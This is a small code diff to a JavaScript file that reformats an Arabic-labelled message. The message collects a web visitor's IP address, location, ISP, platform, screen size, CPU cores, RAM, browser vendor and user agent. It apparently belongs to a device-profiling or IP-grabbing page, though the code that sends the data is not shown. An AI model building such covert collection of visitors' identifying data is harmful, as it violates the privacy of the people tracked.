@@ -102,9 +102,10 @@ const userAgentData = navigator.userAgentData;
 
 
    const message = `
-    الايبي: ${ipAddress}
+
+    \nالايبي: ${ipAddress}
     البلد: ${country}
-    المدينه: ${city}
+    مدينه مزود الخدمه: ${city}
     مزود الخدمه: ${isp}
     المنصه: ${platform}
     عرض الشاشة: ${screenWidth}
@@ -112,8 +113,9 @@ const userAgentData = navigator.userAgentData;
     عدد المعالجات: ${cpuCores}
     الرامات: ${totalRAM}
     شركه السوفتوير: ${vendor}
-    هل هو اندرويد: ${isAndroid ? 'Yes' : 'No'}/n
-    باقي البيانات: ${userAgent}
+     اندرويد: ${isAndroid ? 'اندرويد' : 'ليس اندرويد'}
+
+    \nباقي البيانات: ${userAgent}
 
 `;
 
